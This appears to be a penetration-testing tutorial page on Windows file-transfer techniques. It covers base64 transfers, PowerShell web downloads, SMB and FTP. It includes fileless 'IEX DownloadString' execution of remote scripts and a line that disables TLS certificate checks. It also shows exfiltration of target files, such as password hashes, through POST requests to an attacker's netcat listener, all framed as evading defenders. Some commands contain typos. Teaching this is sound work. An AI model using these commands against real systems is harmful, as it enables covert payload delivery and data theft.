<!DOCTYPE html>
<head>
    <title>Shellhop.com</title>
    <link href="/style.css" rel="stylesheet">
</head>
<body>

    <!-- Including the header file -->
    <?php
    require_once("../config.php");
    require_once(ROOT_PATH . "/resources/header.php");
    ?>

    <main>
        <h1 class="page_header">File Transfers</h1>
        <section class="introduction_section">
            <h2>Introduction</h2>
            <p>One of the integral skill in computing and especially ethical hacking is transferring files. This may sound silly to say, but given the context of the connections you will find yourself on, having creative ways to move files to and from a target machine is extremely important.</p>
            <p>There may be firewalls in place that are monitoring common ports or traffic. Files may contain information that could help defenders counter our attack attempts and thus need to be descreetly transferred over, some files may be monitored on the victim side for transfer requests and so cannot be directly moved via traditional methods etc.</p>
        </section>

        <section>
            <h2>Windows file transfer methods</h2>
            <p>Windows is an absolutely massive software suite, with many ways to do many things that have been added over the years; transferring files is no exception.</p>
            <p>We will take a look at several methods we can use to move files on Windows systems here.</p>

            <h3>Powershell Base64 Encode and Decode</h3>
            <p>If we have access to some kind of remote shell, as well as the ability to copy and paste text, we can encode a file into Base65, run a command like 'echo' on the client with our Base64 encoded string as the argument and then pipe the output to a file. We then decode that string and run as an executable.</p>
            <p>We start this process with the following command on our local linux machine:</p>
            <code>$ cat &lt;filename&gt; |base64 -w 0;echo</code>
            <p>This outputs the content of 'filename', pipes that output into the 'base64' command with the parameters '-w 0', which will keep the exact formatting of the string. This is important for executables to exclude any unexpected characters like newlines. This command is then passed to 'echo' which reads from stdin when you don't provide an argument.</p>
            <p>We then simply copy this string in our clipboard, and provide it as an argument in the following powershell command on our target.</p>
            <code>$ [IO.File]::WriteAllBytes("C:\Users\Public\&lt;resulting file path&gt;", [Convert]::FromBase64String("&lt;copied base64 string&gt;"))</code>
            <p>Now we have a perfect file match. To verify these files are identical on a byte level, we can generate a hash-based checksum with the following commands.</p>
            <code>$ md5sum &lt;filename&gt;</code><br>
            <code>$ Get-FileHash &lt;filename&gt; -Algorithm md5</code>
            
            <h3>Powershell Web Downloads</h3>
            <p>Powershell as default provides may useful methods for file transfer as built in cmdlets.</p>
            <table>
                <tr>
                    <th>cmdlet</th>
                    <th>Use</th>
                </tr>
                <tr>
                    <td>OpenRead</td>
                    <td>Returns data from a resource as a stream</td>
                </tr>
                <tr>
                    <td>OpenReadAsync</td>
                    <td>Async variant</td>
                </tr>
                <tr>
                    <td>DownloadData</td>
                    <td>Downloads remote data and returns a byte array.</td>
                </tr>
                <tr>
                    <td>DownloadDataAsync</td>
                    <td>Async variant</td>
                </tr>
                <tr>
                    <td>DownloadFile</td>
                    <td>Downloads remote data to a file</td>
                </tr>
                <tr>
                    <td>DownloadFileAsync</td>
                    <td>Async variant</td>
                </tr>
                <tr>
                    <td>DownloadString</td>
                    <td>Downloads a remote resource and returns a string</td>
                </tr>
                <tr>
                    <td>DownloadStringAsync</td>
                    <td>Async variant</td>
                </tr>
            </table>

            <p>These cmdlets are actually methods of the class 'System.Net.Webclient', and so to use them we must invoke a new object of that class which will contain these methods.</p>
            <code>$ (New-Object Net.Webclient).DownloadFile('&lt;target file URL&gt;',&lt;output file name&gt;')</code>
        </section>
        <section>
            <h2>Fileless downloads with 'InvokeExpression' and 'DownloadString'</h2>
            <p>We can use the combination of these two powershell features to run an expression from an external resource purely within memory, never utilizing a filewrite or read operation that could be detected. This attack saves the code to be executed in memory, and executes accordingly.</p>
            <code>$ IEX (new-Object Net.Webclient).DownloadString('&lt;URL of expression in powershell format, typically a PS1&gt;')</code>
            <p>We could also pipe the output of our 'DownloadString' method into the 'IEX' cmdlet directly with a standard pipe.</p>
        </section>
        <section>
            <h2>Invoke-WebRequest</h2>
            <p>This provides a simple 'curl' esque method of downloading files.</p>
            <code>$ Invoke-WebRequest '&lt;url&gt;' -Output &gt;filename&lt;</code>
        </section>

        <section>
            <h2>Common issues with powerhell downloads</h2>
            <p>There are some common issues that can arrise with using powershell to download files. If the 'internet explorer' first-launch menu has never been completed, we will get an error.</p>
            <p>To bypass this error, we use the '-UseBasicParsing' flag with our 'Invoke-WebRequest' command.</p>
            <p>The next issue we may face is when TLS/SSL encryption causes issues. We can simply run the following command to set SSL certificate validation to true.</p>
            <code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</code>
        </section>

        <h1>SMB Downloads</h1>
        <section>
            <h2>SMB</h2>
            <p>We can use the Windows built-in file transfer protocol 'smb' to move files around our systems.</p>
            <p>To copy a file from an SMB server, we can use the built in copy command.</p>
            <code>$ copy \\&lt;Ip address&gt;\&gt;path to file&lt;</code><br>
            <p>This may fail however, as modern windows instances may block downloads from unauthorised servers. There is however, a way around this. We can simply create a username and password in our SMB server, and then authenticate to the server when attempting a download.</p>
            <code>$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</code><br>
            <p>Then on the target machine:</p>
            <code>$ net use n: \\&gt;address&lt;\&gt;path&lt; /user:test test</code>      
        </section>

        <h2>FTP Downloads</h2>
        <section>
            <p>We can often use simple ftp protocol to download files, and an ftp server is very easy to set up on our attacker machine with a python module.</p>
            <code>$ sudo pip3 install pyftplib</code>
            <p>We want to specify port 21, as this is the default port for many ftp clients, however is not the default port for the python module.</p>
            <code>$ python3 -m pyftplib --port 21</code>
            <p>We can then use the previously discussed 'downloadFile' cmdlet in powershell to pull our target file.</p>
            <code>$ (New-Object Net.WebClient).DownloadFile('ftp://&lt;ip address&gt;/&lt;path&gt;', 'C:\Users\Public\ftp-file.txt')</code>
            <p>There are many cases where the shell we are able to get on a machine is not interactive, and therefore we will need to create an ftp command file in order to download our file.</p>
            <code>$ echo open &lt;ip address&gt; > ftpcommand.txt</code><br>
            <code>$ echo USER anonymous >> ftpcommand.txt</code><br>
            <code>$ echo binary >> ftpcommand.txt</code><br>
            <code>$ echo GET file.txt >> ftpcommand.txt</code><br>
            <code>$ echo bye >> ftpcommand.txt</code><br>
            <code>$ ftp ftp -v -n -s:ftpcommand.txt</code><br>
            <p>If this has all gone well, we should be greeted with our prompt again and have the file downloaded.</p>
            
        </section>
        <h1>Uploading operations</h1>
        <h2>Base64 encoding and decoding</h2>
        <section>
            <p>While we have spent time looking at how to get files onto our target system, we should also look at how to extract files from our target aswell. such as cases where we want to pull password hashes, the output of certain commands etc. for analysis.</p>
            <p>The first method we will look at is the same as our previous Base64 encoding and decoding, but in reverse.</p>
            <p>We first encode our file on the target machine.</p>
            <code>$ [Convert]::ToBase64String((Get-Content -path "&lt;Path to target file&gt;" -Encoding byte))</code>
            <p>We need to validate our file will be transferred correctly as well, and so we do this with the MD5 hash as before.</p>
            <code>$ Get-Filehash "&lt;file path&gt;" -Algorithm MD5 | select Hash</code>
            <p>Now we simply copy the outputted base64 value and decode it on our attacker machine.</p>
            <code>$ echo &lt;outputted value&gt; | base64 -d > filename</code>
            <p>Then we can check the contents of the file with the md5 hash.</p>
            <code>md5sum filename</code>
        </section>
        <h2>Powershell web uploads</h2>
        <section>
            <p>Uploading in other ways, such as with powershell, is made more complicated by the fact that most servers do not by default come with an uploads function, and powershell does not come with any prebuilt upload functions either.</p>
            <p>We will need to use a custom python module, 'uploadserver', as well as build our own powershell upload command with available options.</p>
            <code>$ pip3 install uploadserver</code>
            <code>$ python3 -m uploadserver</code>
            <p>Then, on our powershell host we can use the 'invoke expression' command and use a poweshell module created by another user to upload our file to our server.</p>
            <code>$ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')</code><br>
            <code>$ Invoke-FileUpload -Uri http://&lt;path to our server&gt;:8000/upload -File &lt;path to local file&gt;</code>
        </section>
        <h2>Base64 Post request</h2>
        <section>We can also use a web request with a 'post' method to send base64 encoded data to a listener. This is very easy to set up on both the attacker and victim machine.</section>
        <code>$ nc -lvnp 80</code>
        <p>Then on our victim machine:</p>
        <code>$ $data = [System.convert]::ToBase64String((Get-Content -Path '&lt;path to file&gt;' -Encoding Byte))</code>
        <code>Invoke-WebRequest -Uri http://&lt;ip of attacker&gt;/ -Method POST -Body $data</code>
        <p>Our netcat shell will then catch this data, and we can decode it simply by copying the body of the captured request into a decode command.</p>
        <code>$ echo &lt;data&gt; | base64 -d -w 0 > file</code>
    </main>

    <!-- Including footer here -->
    <?php
    require_once(ROOT_PATH . '/resources/footer.php')
    ?>

</body>
